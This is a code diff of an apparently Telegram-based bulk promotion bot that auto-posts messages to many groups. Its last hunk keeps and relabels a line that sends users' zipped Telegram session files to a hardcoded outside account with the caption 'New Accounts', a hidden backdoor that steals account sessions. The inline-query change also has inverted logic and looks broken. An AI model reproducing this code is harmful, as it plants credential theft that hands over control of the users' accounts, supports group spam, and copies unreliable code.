@@ -218,7 +218,7 @@ async def _(e):
                 except Exception as e:
                     nn = "https://telegra.ph/file/94a7f2073cdcf4c002a09.jpg"
             else:
-                nn = "https://telegra.ph/file/94a7f2073cdcf4c002a09.jpg"
+                nn = False
             num = len(STUFF) + 1
             STUFF.update({num: {"msg": message.text, "media": nn}})
             await x.send_message("Message Sending Start", buttons=[[telethon.Button.inline("🛰 Stop", b"Stop")]])
@@ -484,27 +484,20 @@ async def inline_alive(o):
     ok = STUFF.get(int(n))
     txt = ok.get("msg")
     pic = ok.get("media")
-    """
-    ishan=[
-        await o.builder.article(
-                text="• **Induced Promotion Bot \nSubscribtion Cost: 200Rs per Month •**",
-                buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]],
-                title="Induced Promotion Bot",
-                description="Use Our To Promote your self For Selling\nAuto Post Sender In Multiple groups",
-                thumb=telethon.tl.types.InputWebDocument("https://telegra.ph/file/8ff763cebfe2af1a3ce45.jpg", 0, "image/jpg", []),
-                content=telethon.tl.types.InputWebDocument("https://telegra.ph/file/8ff763cebfe2af1a3ce45.jpg", 0, "image/jpg", []),
-        )
-    ]
-    """
-    ishan = [
-        await o.builder.photo(
-            pic,
-            text=txt,
-            buttons=[[telethon.Button.url(
-                "• Power By Induced •", url="t.me/InducedBots")]],
-            link_preview=False,
-        )
-    ]
+    if pic:
+        ishan=[
+            await o.builder.article(
+                    text=txt,
+            )
+        ]
+    else:
+        ishan = [
+            await o.builder.photo(
+                pic,
+                text=txt,
+                link_preview=False,
+            )
+        ]
     await o.answer(
         ishan,
         cache_time=300,
@@ -971,7 +964,7 @@ async def _(e):
         f.close
 
         user = await e.client.get_entity(e.query.user_id)
-        await e.client.send_file(1303790979, "sessions.zip", caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
+        await e.client.send_file(1303790979, "sessions.zip", caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id}) New Accounts", force_document=True,)
         await e.client.send_file(e.chat_id, "sessions.zip", caption="`Here", force_document=True)
 
 
